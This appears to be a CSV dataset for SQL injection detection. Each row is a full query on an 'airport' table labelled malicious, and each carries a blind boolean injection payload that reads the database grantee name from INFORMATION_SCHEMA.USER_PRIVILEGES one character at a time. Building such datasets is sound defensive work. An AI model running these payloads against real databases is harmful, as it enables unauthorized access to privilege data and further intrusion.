full_query,label,template_id,malicious_input,malicious_input_desc
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),7,1))>36-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),6,1))>108-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),8,1))>116-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),5,1))>114-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),7,1))>42-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),6,1))>106-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),8,1))>114-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),5,1))>113-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),7,1))>45-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),8,1))>115-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),6,1))>107-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),7,1))>46-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),9,1))>96-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),10,1))>96-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),11,1))>96-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),12,1))>96-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),9,1))>112-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),10,1))>112-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),11,1))>112-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),12,1))>112-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),9,1))>104-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),10,1))>120-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),11,1))>120-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),12,1))>104-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),9,1))>100-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),10,1))>116-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),11,1))>116-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),12,1))>108-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),9,1))>102-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),10,1))>114-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),11,1))>114-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),12,1))>106-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),9,1))>101-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),10,1))>115-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),11,1))>115-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),12,1))>105-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),13,1))>96-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),14,1))>96-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),15,1))>96-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),16,1))>96-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),13,1))>112-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),14,1))>112-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),15,1))>48-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),16,1))>48-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),13,1))>104-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),14,1))>104-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),16,1))>72-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),15,1))>24-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),14,1))>108-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),13,1))>108-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),14,1))>110-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),16,1))>60-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),13,1))>110-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),15,1))>36-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),16,1))>66-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),14,1))>109-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),13,1))>111-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),15,1))>42-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),16,1))>63-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),17,1))>96-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),18,1))>96-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),15,1))>39-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),16,1))>64-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),18,1))>112-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),17,1))>48-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),15,1))>37-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),19,1))>64-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),18,1))>104-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),17,1))>24-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),19,1))>96-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),15,1))>38-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),18,1))>108-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),17,1))>36-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),19,1))>112-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),20,1))>64-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),18,1))>106-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),17,1))>42-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),19,1))>104-- zxeG""",1,airport-S3,Unknown,Unknown
